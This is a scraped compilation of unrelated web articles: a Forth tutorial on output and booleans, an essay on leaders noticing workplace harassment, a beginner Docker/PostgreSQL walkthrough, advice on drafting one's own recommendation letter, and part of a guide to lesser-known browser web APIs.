a string to output, and the end of the string is marked by <code>"</code>. The closing <code>"</code>
isn’t a word, and so doesn’t need to be space-delimited. Here’s an example:</p>

<pre><code>: say-hello  ." Hello there!" ;
say-hello
</code></pre>



<p>You should see the following output</p>

<p>say-hello <span>Hello there! ok</span></p>

<p>We can combine <code>."</code>, <code>.</code>, <code>cr</code>, and <code>emit</code> to build up more complex output:</p>

<pre><code>: print-stack-top  cr dup ." The top of the stack is " .
  cr ." which looks like '" dup emit ." ' in ascii  " ;
48 print-stack-top
</code></pre>



<p>Running this should give you the following output:</p>

<p>48 print-stack-top <span>
The top of the stack is 48
which looks like '0' in ascii   ok</span></p>

<h2 id="conditionals-and-loops">Conditionals and Loops</h2>

<p>Now onto the fun stuff! Forth, like most other languages, has conditionals and
loops for controlling the flow of your program. To understand how they work,
however, first we need to understand booleans in Forth.</p>

<h3 id="booleans">Booleans</h3>

<p>There’s actually no boolean type in Forth. The number <code>0</code> is treated as false,
and any other number is true, although the canonical true value is <code>-1</code> (all
boolean operators return <code>0</code> or <code>-1</code>).</p>

<p>To test if two numbers are equal, you can use <code>=</code>:</p>

<pre><code>3 4 = .
5 5 = .
</code></pre>

<p>This should output:</p>

<p>3 4 = . <span>0  ok</span>
5 5 = . <span>-1  ok</span></p>



<p>You can use <code>&lt;</code> and <code>&gt;</code> for less than and greater than. <code>&lt;</code> checks to see if the
second item from the top of the stack is less than the top item of the stack, and
vice versa for <code>&gt;</code>:</p>

<pre><code>3 4 &lt; .
3 4 &gt; .
</code></pre>

<p>3 4 &lt; . <span>-1  ok</span>
3 4 &gt; . <span>0  ok</span></p>



<p>The boolean operators And, Or, and Not are available as <code>and</code>, <code>or</code>, and <code>invert</code>:</p>

<pre><code>3 4 &lt; 20 30 &lt; and .
3 4 &lt; 20 30 &gt; or .
3 4 &lt; invert .
</code></pre>

<p>The first line is the equivalent of <code>3 &lt; 4 &amp; 20 &lt; 30</code> in a C-based language.
The second line is the equivalent of <code>3 &lt; 4 | 20 &gt; 30</code>. The third line is the
equivalent of <code>!(3 &lt; 4)</code>.</p>

<p><code>and</code>, <code>or</code>, and <code>invert</code> are all bitwise operations. For well-formed flags
(<code>0</code> and <code>-1</code>) they’ll work as expected, but they’ll give incorrect results for
arbitrary numbers.</p>



<h3 id="if-then"><code>if then</code></h3>

<p>Now we can finally get onto conditionals. Conditionals in Forth can only be
used inside definitions. The simplest conditional statement in Forth is <code>if
then</code>, which is equivalent to a standard <code>if</code> statement in most languages.
Here’s an example of a definition using …</p></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div> <p>In any organization, there will be people who behave inappropriately, sometimes grievously so. Here’s the paradox: the more senior the role you’re in, and the more power you have to help coworkers who are facing awful behavior like harassment or bullying, the less likely you are to see those things.</p>
<p>Simply put, if you’re in a position of power at work, you’re unlikely to see workplace harassment in front of you. That’s because harassment and bullying are attempts to exert power over people with less of it. People who behave improperly don’t tend to do so with people they perceive as having power already.&nbsp;</p>
<p>When I was younger and in more junior roles, I dealt with harassment all the time. It was a defining characteristic of several jobs I had. What stands out in my memory from those roles isn’t what I learned or how I grew, but how hard I worked to avoid the men (it was always men) who made me feel meek and small. But over time, as I’ve moved up in my career, harassment has become steadily less prevalent in my work life.&nbsp;</p>
<p>A few years ago, when I was on the executive team of an org that employed around 250 people, nearly all of whom seemed very lovely to me, I wondered if perhaps I had found a group of people that simply didn’t include any bad apples. Spoiler alert: I had not.</p>
<p>Some months into the job, somebody made an offhand comment in front of me about a mid-level designer – a man in his 30s who was, apparently, well known for making young women in the organization feel uncomfortable. Let’s call this man Peter. Peter was also the first person to invite me out for coffee on my first day on the job. I had thought it a little curious at the time, since our work wasn’t going to overlap much. But he had been very friendly, sharing almost too much information about past problems at the org. I hadn’t thought too much of it.&nbsp;</p>
<p>It wasn’t until months later that I heard Peter described by a junior employee in a tone of voice that suggested everyone knew he was a problem. It was as if I’d stepped out of the Matrix and could now see reality. Suddenly, I understood why he had sought to establish a relationship with me early on. I was going to have power in the org, and he wanted that power to view him favorably. I also realized that most or all of the other people at my level – the very people who could do the most to address Peter’s behavior – likely didn’t know what everyone else thought was common knowledge.&nbsp;</p>
<p>Imagine it: a majority of people at the company know or have a feeling that something is wrong. Everyone they talk to regularly knows it, too. Nobody among them thinks to discuss it with the most senior people, because as far as they can tell, everyone knows. And if the senior team isn’t doing anything, they must not care. Indeed, it probably isn’t safe to raise the issue with them because they all seem friendly with Peter.&nbsp;</p>
<p>At that point in my career, I had spent a lot of time working on diversity, equity and inclusion. I had an undergrad degree in gender studies, and I was quite aware of organizational dynamics and structural oppression; I was on the path that I remain on to understand and use my advantages as a White person to change the workplace. And yet, I was stunned to realize that I had passively become a reinforcing part of the very type of harassment that I had struggled with for years. That was not the last surprise.</p>
<p>In my current job, I recently posted about this dynamic in a public Slack channel. Two of my colleagues – cis, White, middle-aged men who manage managers – reached out to me individually to say that they were glad I was talking about this, because they didn’t know what harassment looked like, and they wanted to learn so they could watch out for it. One of them said simply, ‘I’ve been a straight white guy my whole life. Nobody harasses me.’</p>
<p>I was pushed through the Matrix again. Not only was it possible that people in senior leadership positions at work had never been harassed, it was also possible that they didn’t even know what it looked or felt like.&nbsp;</p>
<h2>So what does harassment look and feel like?&nbsp;</h2>
<p>Harassment is, unfortunately, a big category (and some of this discussion might be triggering). You are probably aware of the legal guidelines here, which prohibit quid pro quo (e.g. ‘I’ll give you a raise if you sleep with me’) and create a hostile environment (e.g. bullying people or teasing them in a demeaning way). Often, though, harassment and bullying fall somewhere in between these things. To people experiencing these things, they might look like, among many other things:</p>
<ul><li data-gc-list-depth="1" data-gc-list-style="bullet"><strong>Unwanted invitations.</strong>&nbsp;Asking a coworker to join you for drinks, dinner, or even lunch, especially after they’ve already said no.</li>
<li data-gc-list-depth="1" data-gc-list-style="bullet"><strong>Unwanted attention.</strong>&nbsp;Commenting on a coworker’s appearance i.e., clothing, hair, makeup, or body.&nbsp;</li>
<li data-gc-list-depth="1" data-gc-list-style="bullet"><strong>Unwanted touching.&nbsp;</strong>Slightly prolonged taps, feeling somebody’s hair, hugging. Even a few years ago, hugging at work was common in some workplaces. That’s less the case now, both because it can shade into harassment and also because it’s more widely understood that some neurotypes find any kind of touching uncomfortable.</li>
<li data-gc-list-depth="1" data-gc-list-style="bullet"><strong>Unwanted online interactions.</strong>&nbsp;Sliding into somebody’s DMs with suggestive emojis or sending flirtatious emails.&nbsp;</li>
<li data-gc-list-depth="1" data-gc-list-style="bullet"><a data-gc-link="https://en.wikipedia.org/wiki/Microaggression#:~:text=Microaggression%20is%20a%20term%20used,group%2C%20particularly%20culturally%20marginalized%20groups." href="https://en.wikipedia.org/wiki/Microaggression#:~:text=Microaggression%20is%20a%20term%20used,group%2C%20particularly%20culturally%20marginalized%20groups."><strong>Microaggressions of all types</strong></a><strong>.</strong>&nbsp;Although I’m using it broadly here, the term was originally coined in 1970 to describe racist comments, specifically. Notably, in his recent book,&nbsp;<em>How to Be an Antiracist</em>, Ibram X. Kendi rejects the term, in part because, ‘A persistent daily hum of racist abuse is not minor…I use the term “abuse” because that describes the action and its effects on people.’</li>
</ul><p>Again, it’s critical to understand that harassment and bullying are expressions of power, so the perpetrator has status over the person they’re targeting: either from the org chart or from social systems like patriarchy and White supremacy. In other words, a White peer can abuse a Black coworker, an able-bodied peer can harass a disabled coworker, and so forth. It doesn’t require a senior title, though that almost always increases the impact.&nbsp;</p>
<p>That impact is significant. If you’re in a position of societal or organizational power, these behaviors may seem small; if you’re lower in power, they can be devastating, causing people to question their own actions and worth. People who have to field these behaviors in a workplace are, at a very minimum, distracted and drained. Depression is common, and even suicide is a possible result. The fact that the patterns may be hidden from you does not make them less significant.&nbsp;</p>

<p>Having shared that glimpse of what harassment is, I’m going to talk about what we – the leaders in our organizations – can do to become aware of it, and how we can tell if our actions are effective. Because we can’t take action if we don’t realize bad behavior surrounds us, I’m going to focus on creating the conditions for awareness, not on actually addressing harassment or bullying. Once you become aware, you can work with other leaders to address it.&nbsp;</p>
<p>Here are five things I’ve done to make it easier for people to talk with me about behavior that’s hidden from me.&nbsp;</p>
<ul><li data-gc-list-depth="1" data-gc-list-style="bullet">A few times a year, I post a public message in Slack about how I used to experience harassment all the time, but now I rarely see it at all because of my title. So even though I’m more likely in a position to help, I need other people’s help to understand what’s happening. I post infrequently enough that people pay attention, but often enough that new people get the message.</li>
<li data-gc-list-depth="1" data-gc-list-style="bullet">I’m unsurprised when I hear that somebody with social power who is very friendly to me has been causing problems for other people. In other words, I believe the stories of marginalized and underrepresented people over my own experience. (This is hard!)</li>
<li data-gc-list-depth="1" data-gc-list-style="bullet">I hold skip-level meetings at least quarterly, so that everyone who reports up to me knows who I am and that my door is open.&nbsp;</li>
<li data-gc-list-depth="1" data-gc-list-style="bullet">I welcome and cultivate professional 1:1 relationships with younger people who don’t report to me. They’re often aware of problems in the organization and need support outside their reporting chain to figure out how to speak up.</li>
<li data-gc-list-depth="1" data-gc-list-style="bullet">I talk often about inequity. Being vocal about it is a signal to people throughout the organization about the values I hold and the culture I’m aiming to help create.&nbsp;</li>
</ul><h2>How do you know if any of this is working?&nbsp;</h2>
<p>There are a few signs I look for.&nbsp;</p>
<p>Are junior people in the organization seeking me out to talk about uncomfortable things? For example, are they coming to me because they think they’re being underpaid but don’t know how to ask their manager for a raise? Are they coming to me because they’re worried that their work is suffering due to a recent breakup and they don’t know if they should tell their team lead? When these conversations come up, it’s likely that I’ve built some trust with people who don’t report directly to me or aren’t in my reporting chain at all.</p>
<p>Are junior people in the organization coming to me because they’ve heard I’m good to talk with? That’s often a sign that I’m developing a reputation for having perspective beyond my own experience. (It’s worth noting that I’m not universally helpful. None of us can be good for everyone to talk with.)&nbsp;&nbsp;</p>
<p>Are the people who report to me bringing up power dynamics on their teams so that we can talk through potential issues? That suggests they know that I care about power dynamics.&nbsp;</p>
<p>Ultimately, we have to ask ourselves: are people talking to me about harassment or bullying they see or experience? And we have to understand that if they are not, that doesn’t mean it isn’t happening. Instead, it means you don’t know about something very vital that is almost certainly happening around you all the time. If you aren’t hearing about it, it’s time to take action to ensure that you do.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>Yet another blog about docker that could be found in documentations, you might think. Legit opinion. But this is <strong>for those who don't want to be pointed to the bunch of documentation</strong>. And for those who would like to have some real use case in front of them when learning new concepts.</p>
<p>It's for beginners. So for those who heard about docker but never tried them. For those who heard their colleagues talking about it, but felt insecure to even ask how does it work. I might turn this into series of articles, we will see.</p>
<h2 id="real-life-dev-scenario-postgresql-on-your-next-project">Real life dev scenario - PostgreSQL on your next project</h2>
<p>Let's make a scene. Not the drama scene, but just to relax our mind a bit. This is not a post where you are presented a bunch of commands that's it. This should have a soul 😊.</p>
<p>You found out that your next project will involve, say, PostgreSQL. You never worked with it, you want to see how it looks like, and to prepare yourself for that project. Also, you already have a local machine set up for the current project. with totally different technologies. You don’t want to make more "mess". </p>
<h2 id="docker-hub">Docker Hub</h2>
<p><a target="_blank" href="https://hub.docker.com/">Docker Hub</a> will be your starting point in many cases, so let’s write a few words about it. We will use it also in this workshop to find images we need. It’s also a place where images are documented, so you’ll probably come back here many times.</p>
<p>Also, a tip for the future, start asking yourself <em>"Does XYZ have a docker image I can use?"</em>. Open it now and try searching some images, for example, <code>mysql, wordpress, ghost, elasticsearch, php, java, maven, gradle, python</code>. You see my point? You can find almost anything as a docker image.</p>
<p>You may notice this <a target="_blank" href="https://docs.docker.com/docker-hub/official_images/">OFFICIAL IMAGE</a> mark. That means the people who developed that technology, are most likely involved in developing and maintaining the docker image. There are other advantages, of course, check the documentation.</p>
<p>But it’s ok to use unofficial ones, too. Especially if you are experimenting with something. For example, my colleagues were developing an app in <code>React Native</code>. I didn’t have anything setup for compiling React Native project. All I wanted was to build an <code>APK</code> file and use it on my mobile phone. So I’ve just pulled the unofficial image that has everything installed there. Built my APK file and that’s it.</p>
<p>Ok, that’s enough for Docker Hub. Lets' move on.</p>
<h2 id="images">Images</h2>
<p>The first step is to check out <a target="_blank" href="https://hub.docker.com/search/?q=postgres&amp;type=image">Postgres image on Docker Hub</a>. This is the link, but feel free to go there and search it directly. </p>
<p>If you take a look at the description, you’ll see the supported tags and respective <code>Dockerfile</code> links. Consider tag as a version for the moment. There is also a whole tab dedicated to TAGS where you can find all the tags of this image. But the ones in the Description tab are supported ones. At the moment, supported tags go back down to version <code>9.5.22</code>. Also, versions in the tag are very likely to represent the version of the technology in the image. For example, <code>Python</code> image tagged as <code>3.6.8- stretch</code> will have <code>Python v3.6.8</code> in it. I’ll explain this <code>stretch</code> later.</p>
<p>OK, now we want to get a <code>Postgres</code> image. As this blog is static, we will stick with the version <code>11.8</code>. Postgres meanwhile released another tags, but for the sake of the blog we will use the <code>version 11</code>. The blog was tested with the version <code>11.2</code>, so we should stick with the major version 11.</p>
<p>There are two groups of tags, you may notice</p>
<pre><code># <span>output</span>
11<span>.8</span>, 11
11<span>.8-alpine</span>, 11<span>-alpine</span>
</code></pre><p>You may wonder what’s the difference.</p>
<p>Let’s pull both of them with commands below, and I’ll explain a bit while you wait for them to download. Yes, actually stop reading the blog and execute these two commands, one after another.</p>
<pre><code>$ docker pull <span>postgres:</span><span>11.8</span>
$ docker pull <span>postgres:</span><span>11.8</span>-alpine
</code></pre>
<p>OK, as you might see in browser (on the Ducker Hub page), each tag in one line links to the same <code>Dockerfile</code>. So it doesn’t matter if you are using <code>11.8</code> or <code>11</code>. At the moment of writing the initial blog article, in this line there was also a <code>latest</code> tag. The <code>latest</code> version back at the time was <code>11</code>. Now the latest is moved to the <code>version 12</code>. There are also beta versions 13 which will eventually become stable and thus <code>latest</code>. You get the point. Be careful with tag latest, as it will switch to the newer version in some time. I would suggest you to use specific tags instead of the <code>latest</code>. As you would do with any other dependencies and libraries.</p>
<p>But what about this <code>alpine</code> group of tags? At this moment your images may be ready, if not wait till they are, and execute</p>
<pre><code>$ docker images
</code></pre><p>You may see something like this, (your results may vary slightly):</p>
<pre><code># <span>output</span>
<span>postgres</span>           11<span>.8</span>             ...          312<span>MB</span>
<span>postgres</span>           11<span>.8-alpine</span>.     ...         70<span>.8MB</span>
</code></pre><h2 id="its-all-about-sizes">It's all about sizes</h2>
<p>Notice the difference in the size of those docker images. Docker is all about minimising resources you need to run something. It would be way heavier, for example, to run a complete virtual machine. Docker is not a virtual machine but that’s beyond the scope of this material. With Docker, you can have running <code>Postgres</code> server in <code>70 MB</code>. Consider Docker containers as an isolated process that runs on your machine.</p>
<p>If you open each of the Postgres <code>Dockerfiles</code> (find the links on the Docker Hub, I mean it, go and click it) you will see they are built on top of different Docker base images. I’m talking about <code>Dockerfiles</code> in <code>Postgres</code> image documentation. There will be something like <code>FROM debian:stretch-slim</code> and <code>FROM alpine:3.11</code>. You don’t have to understand anything about <code>Dockerfile</code> for now. Let’s just say that our <code>Postgres</code> images have to run on some architecture, and in this case, it’s Debian or Alpine. You may see different tag suffixes, such as <code>stretch</code>, <code>slim</code>, <code>jessie</code> and they refer to the base image they are built on. The size of an image, <strong>and also a set of available tools</strong> will depend on that, as well. In the end, they throw out all unnecessary things to achieve the small size. Consider that later when you get familiar with Docker. We’ll use <code>alpine</code> images for now. If you check <a target="_blank" href="https://alpinelinux.org/">Alpine distribution</a> site you’ll notice this motto:</p>
<blockquote>
<p>Small. Simple. Secure.</p>

<h2 id="summary">Summary</h2>
<p>Think about what you've read. It may be all confusing. That's ok. Feel free to read it again. Docker is a complex thing. Many will try to grasp as much as possible about Docker and it will just cause a mess in their head. Especially if you're new into this. That's why I provided only fraction here. But this fraction will be enough for your next steps.</p>
<p>Thanks for reading. </p>

  <p>I meet regularly with early-career software developers. A few recurring meetings, 1x/week, plus ad-hoc calls as needed with others.</p>

<p>A question came up recently:</p>

<blockquote>
  <p>My three-month internship is close to wrapping up. The Co-founder/CEO/lead developer of the consulting company I’m at likes me, said he wishes he could hire me but cannot, because they don’t have enough work in the pipeline.</p>

  <p>He said he’d write me a letter of recommendation, and asked me to draft it for him.</p>

  <p>How do I write my own letter of recommendation, for my first real software development job?</p>
</blockquote>

<p>Feels like a trap, huh?</p>

<p><img src="https://josh.works/images/office-hours-tufts.jpeg" alt="who are you?"></p>

<p><a href="https://admissions.tufts.edu/blogs/jumbo-talk/post/the-office-hours/"><em>source</em></a></p>

<p>Or, maybe they know you. They know you <em>too well</em></p>

<p><img src="https://josh.works/images/recommendation-warning.jpg" alt="untrustworthy"></p>

<p><a href="https://blacklawyermagic.wordpress.com/"><em>source</em></a></p>

<p>I explained a few concepts that we wanted to “speak to” in the letter. I’ll explain.</p>

<p>The software developer that I meet with mentioned that the CEO’s advice on the next job included “be able to speak to low liability”.</p>

<p>I wanted to dig into this “liability” piece.</p>

      </h2>
    

<p>What’s the biggest risk in hiring?</p>

<p>It’s <em>the risk of a bad hire</em>.</p>

<p>How much does it cost to make a bad hire?</p>

<p>I would conservatively estimate that it costs $100,000 and nine months of your life. Here’s how the math works from a hiring manager’s point of view:</p>

<ol>
  <li>Spend a month and 25 hours of labor dev team manager labor to find/interview the candidate(s) and winnow the applicants down to someone to make an offer.  (the hiring manager would prefer to be doing <em>literally anything else but hiring</em>.)</li>
  <li>Extend an offer, wait 2-6 more weeks before the new candidate starts. It can be painful to wait another six weeks, because the team is currently short-staffed, and has been for a long time. That’s why they’re hiring!</li>
  <li>Start date! Start paying $150,000/yr or $3000/week for your shiny new employee.</li>
  <li>Pay $12,000 for the first month of them working, figuring out your dev environment, ticket management, who knows what parts of the codebase, and a few easy bug fixes.</li>
  <li>Start getting nervous. Employee not batting it out of the park like you’d hoped. Maybe still onboarding, give it another month (and $12,000 in payroll expense).</li>
  <li>OK. Three months in and another $36,000 in payroll later, you’re pretty sure there’s a problem.</li>
  <li>Start the pre-Performance Improvement Plan work. Talk to their team, their manager, them. Why is it not working? Why is the team <em>working slower</em> with this new team member, instead of working faster? <em>Not only are you wasting five figures of payroll, the rest of your expensive dev team is producing less as well!</em></li>
  <li>Pre-PIP work is over. Another $5k in payroll gone forever. Now it’s time to give the formal PIP, which everyone knows is “beginning the firing process”</li>
  <li>Two more months and $24,000 in payroll later, you fire the employee.</li>
  <li>You feel relief with having gotten rid of the bad employee. You’re thrilled that you can get back to normal work.</li>
  <li>Check the clock and balance sheet. It took you nine months and $100k to get to where you were at step 1.</li>
</ol>

<p>Add up the time/expense:</p>

<ol>
  <li>1-2 months to to find/hire a candidate.</li>
  <li>7-8 months (and $84K-$96k) to hire, trial them, try to help them be successful, give up on that plan, and fire them.</li>
  <li>Many hours spent thinking about this specific problem, talking with others about it.</li>
</ol>

<p>There’s nine months of your life. That’s 9 months of time, sure, but it’s also 9 months of <a href="https://en.wikipedia.org/wiki/Opportunity_cost">opportunity cost</a>. What if you’d hired a great candidate? They’d be rapidly approaching their first year on the job, and everyone would be happy about it, instead of this disaster you’ve had to deal with.</p>

<p>Here’s the really scary part: To large organizations (1000+ employees), <em>wasting $100k is meaningless compared to the wasted time and mis-directed effort</em>. The entire organization is more annoyed at having <em>lost the time of a productive software developer</em>. They don’t care that they lit a giant pile of money on fire, <em>they’re annoyed that their competitor is getting new features out the door and gaining marketshare and the future of their $x,000,000 company hangs in the balance</em>.</p>

<p>Oh, and the good managers, not only do they want to be wise with money and build features/gain market-share…</p>

<p>They want to see their team flourish.</p>

<p>Being fired is a life-defining moment. (I speak from experience)</p>

<p>If you’re a kind and empathetic person, <em>it’s particularly unpleasent to fire someone and it feels like a personal failure</em>.</p>

<p>You want to work for a kind and empathetic manager. (They’re not common, but they’re not impossible to find.)</p>

<p>So, tailor your letter to speak to the concerns of a kind and empathetic manager. This manager would:</p>

<ul>
  <li>Want to see you do well</li>
  <li>Want to see you develop your skills and competencies</li>
  <li>Want you to make meaningful contributions to the product</li>
  <li>Want a healthy team dynamic</li>
  <li>Want you to voice concerns and observations as relevant</li>
</ul>

<p>And much more</p>

          A Primary-goal for an early-career software developer: Telegraph Low Liability <a href="#a-primary-goal-for-an-early-career-software-developer-telegraph-low-liability">#</a>
        
        
      </h2>
    

<p>First, when I say <code>telegraph low liability</code> I mean it in the <a href="https://en.wikipedia.org/wiki/Telegraphing_(sports)">sports definition</a>:</p>

<blockquote>
  <p>In sporting terminology, to <strong>telegraph</strong> is to unintentionally alert an opponent to one’s immediate situation or intentions. The sporting use of the term <em>telegraph</em> draws a direct comparison with the communication device of the same name. “Telegraphing” always refers to a reflexive physical action rather than a protracted or intellectual give-away. For example, a boxer rotating his shoulders to throw a hook would be telegraphing.</p>
</blockquote>

<p>You should aim to “telegraph” that you’re a low-liability hire <em>without ever saying it so explicitely</em>. It’s a subtle thing, best communicated incidentally, not directly.</p>

<p>Five years ago, I wrote <a href="https://josh.works/so-you-want-to-work-remotely">So you want to work remotely…</a></p>

<p>Quoting myself:</p>

<blockquote>
  <p>First, there’s the matter of framing how you go about working remotely. Obviously you want to work remotely, but put yourself in the shoes of a prospective employer. They don’t care if you work remotely or not - they want you to do great work for them and make them an effective, profitable organization.</p>

  <p>Companies that hire remotely tend to be younger, agile-er, and smaller. So every employee matters. Making a bad hire can be catastrophic in terms of money and <a href="https://en.wikipedia.org/wiki/Opportunity_cost">opportunity cost</a>. Your job is to make it very, very obvious that hiring YOU is a great decision. In fact, you want to be so good at what you do that passing up on you is a terrible decision.</p>

  <p>[…]</p>

  <p>When you can walk someone down the path from “Hire me” to “I’ll help you make <code>$x00,000/year</code> more than you would otherwise”, <em>you’re talking their language</em>. You’re <em>telegraphing</em> that you understand their concerns without ever stating their concern explicitly.</p>
</blockquote>

<p>To bring it full circle, here’s how I would go about <em>drafting</em> a CEO’s Letter of Recommendation <em>for me</em>. If you find this idea uncomfortable, don’t worry about it. That’s a sign of psychological health, that you don’t love putting flattering words <em>about yourself</em> into other people’s mouths.</p>
      
    

<p>Normally, that’s a good aversion to have. For this particular situation, you’ll have to bite the bullet and move on. I’m not going to give you the actual words (how could I?) but I’ll explain my process. I’ll include comments throughout:</p>
      <h3 id="1-draft-the-openingclosing">
        
        
          1. Draft the opening/closing <a href="#1-draft-the-openingclosing">#</a>
        
        
      </h3>
    

<div><div><pre><code>Hi there,         
# I find it easier to strike a natural tone when thinking relatively
# informally. So, I draft documents, even if they'll end up being 
# formal, informally. 
             
             
Sincerely, 
- Boss's name, Title, Company
# Yes, I write the closing right after the opening.
</code></pre></div></div>
      <h3 id="2-provide-1-general-introductioncontext-sentence">
        
        
          2. Provide 1 general introduction/context sentence <a href="#2-provide-1-general-introductioncontext-sentence">#</a>
        
        
      </h3>
    

<div><div><pre><code>Hi there,

# Establish the relationship. This helps readers contextualize 
# what comes next
I met {person I am recommending} {n months ago} because

</code></pre></div></div>
      <h3 id="3-say-a-complementary-thing-about-yourself">
        
        
          3. Say a complementary thing about yourself <a href="#3-say-a-complementary-thing-about-yourself">#</a>
        
        
      </h3>
    

<p>This is the first uncomfortable sentence you’ll have to write:</p>

<div><div><pre><code>Hi there,

I met {Zaniyah} {a few months ago} because {she and I crossed paths
at a local Ruby meetup}.

# No gushing required. A claim of "I would hire this 
# person if I could" is plenty strong social signaling. 
I wish I could hire them myself, but don't have the budget and work
lined up to utilize them to their full potential. 

Sincerely,
- Boss's name, Title, Company
</code></pre></div></div>
      
    

<p>This can be hard to think of an anecdote. It might take a few attempts to feel good about the one you’ve chosen and how you speak of it. Just write something down, see how you feel, delete it, write something else down, etc.</p>

<div><div><pre><code>Hi there,

I met {Zaniyah} {a few months ago} because {she and I crossed paths 
at a local Ruby meetup}.

# add a punchy positive story
When she started at {company}, one of the first things she did was 
make many updates to our onboarding documentation. 

It was rather out-of-date, and the team hadn't had new hires in a 
while. 

Any time she ran into friction or trouble, she would hunt down the 
answer, and immediately update the documentation so the next 
person would have a smoother process.

Sure enough, the next hire spent half the time she …</code></pre></div></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><code>API</code> is the acronym for Application Programming Interface which defines interactions between multiple software architecture layers. Programmers carry out complex tasks easily using APIs in software development. Without APIs, a programmer's life would have been miserable with no proper(security, for example) access to data,  knowing unnecessary low level details etc.</p>
<p>When it comes to Web APIs, there are extremely useful  objects, properties and functions available to perform tasks as minor as accessing DOM to as complex as managing audios, videos, graphics, etc. </p>

<p>If you are from the web development background, you are using many of them already. Here is the list of very well known web APIs.</p>
<ul>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API">Canvas</a></li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch</a></li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/History_API">History</a> </li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API">Geolocation</a> </li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model">DOM</a></li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Console_API">Console</a></li>
<li><a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/HTML_Drag_and_Drop_API">Drag &amp; Drop API</a></li>
</ul>
<p>In this article, I am going to talk about 10 more web APIs that are not so popular. Lesser popular doesn't mean, they are not useful. You can use them in various use-cases of your project. Please have a look.</p>

<p>If you would like to jump into the source code or see the demonstration immediately, here are the quick links to them:</p>
<blockquote>
<ul>
<li><a target="_blank" href="https://github.com/atapas/demolab/tree/master/code/src/demos/web-apis">Link to the Source Code @GitHub</a></li>
<li><a target="_blank" href="https://demo.greenroots.info/categories/web-apis/">Link to the Web API DemoLab</a></li>
</ul>
</blockquote>
<p>Note: Web APIs are nothing but the interfaces, functions, objects, properties written and exposed using vanilla JavaScript. However the usage of the web APIs is not limited to the vanilla JavaScript based application alone. It is very straightforward to use them with an Angular, React or Vue based applications as well.</p>
<p>All the examples I have used to demonstrate the web apis in this article are written using reactjs. You can find them in the github link mentioned above. Please feel free to fork, change and use!</p>

<p>A big (pain) point about  using a web API is, most of them are not standardized yet. It means, the support for a web API  may differ from one browser vendor to another. For example, You may find an API working with the Chrome browser but, not supported by Firefox or Edge browsers yet.</p>
<p>I would suggest a couple of ways to have a check on this,</p>


<p>Alright, time to get started knowing them. Hope you also find these useful.</p>
<h2 id="1-fullscreen-api">1. 📺 Fullscreen API</h2>
<p>Do you have the need to show any of the DOM elements in full-screen mode? The full-screen use-case is very demanding for gaming applications, online video platforms(like, youtube) etc. </p>
<p>The <code>Fullscreen API</code> provides methods to present a specific Element (and its children) in a full-screen mode. There is a method available to exit full-screen mode once it is no longer needed. Not only that, this API can also help to perform any actions when a DOM element transition into a full-screen mode or comes out of it.</p>
<p>In the example below, my favorite Santa Claus can get into the full-screen mode and come out of it with ease.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598715764074/fR7trCfsA.gif?auto=format,compress&amp;gif-q=60" alt="full_screen.gif"></p>
<p>In the code below, the <code>manageFullScreen()</code> function uses  the <code>requestFullscreen()</code> API on an element which is having an id called, <code>fs_id</code>. </p>
<pre><code><span>const</span> manageFullscreen = () =&gt; {
   <span>document</span>.getElementById(<span>'fs_id'</span>).requestFullscreen();
}
</code></pre>
<p>This element with id, <code>fs_id</code> is a <code>DIV</code> with a child element, i.e, the Santa Clause image.</p>
<pre><code>&lt;div className=<span>"column"</span>&gt;
  <span><span>&lt;<span>div</span> <span>id</span>=<span>"fs_id"</span>&gt;</span>
    <span>&lt;<span>Img</span> <span>fixed</span>=<span>{imageData.image.childImageSharp.fixed}</span> <span>alt</span>=<span>"santa"</span> /&gt;</span>
   <span>&lt;/<span>div</span>&gt;</span>

    <span>&lt;<span>StyledButton</span> 
         <span>onClick</span>=<span>{manageFullscreen}</span>&gt;</span>
            Enter Fullscreen with Santa
    <span>&lt;/<span>StyledButton</span>&gt;</span>
 <span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>You can check if the <code>Fullscreen API</code> is supported by the browser,</p>
<pre><code><span>if</span> (<span>document</span>.fullscreenEnabled) {
   setSupported(<span>true</span>);
} <span>else</span> {
   setSupported(<span>false</span>);
}
</code></pre>
<p>Also watch out for the useful handlers like,</p>
<ul>
<li><code>onfullscreenchange</code>: An event handler for the fullscreenchange event.</li>
<li><code>onfullscreenerror</code>: An event handler for the fullscreenerror event.</li>
</ul>

<p>What is a clipboard in comuping?</p>
<blockquote>
<p>The clipboard is a buffer that some operating systems provide for short-term storage and transfer within and between application programs.</p>
</blockquote>
<p>There are mainly three operations you can perform with the clipboard. They are, <code>copy</code>, <code>cut</code> and <code>paste</code>. The Clipboard API provides the ability to respond to these three operations. </p>
<p>Interestingly, copying content to the clipboard is open as in, there is no need of a user permission. However, for pasting the content from the clipboard to the user application, the user needs to grant permission for it. It is achieved using another web API called, <a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Permissions_API">Permission API</a></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598716493747/PwPwDDK8Y.png?auto=format&amp;q=60" alt="image.png"></p>
<p>Here is a simple example of the copy-paste operation,</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598716547383/PoXUNZmnr.gif?auto=format,compress&amp;gif-q=60" alt="clip_board.gif"></p>
<p>This is how to check if the feature is supported by the browser,</p>
<pre><code><span>if</span> (navigator.clipboard 
     &amp;&amp; navigator.clipboard.read 
     &amp;&amp; navigator.clipboard.write) {
   setSupported(<span>true</span>);
} <span>else</span> {
   setSupported(<span>false</span>);
}
</code></pre>
<p>Here is the async API function for writing the content to the clipboard,</p>
<pre><code><span>async</span> <span><span>function</span> <span>performCopy</span>(<span>event</span>) </span>{
   event.preventDefault();
   <span>try</span> {
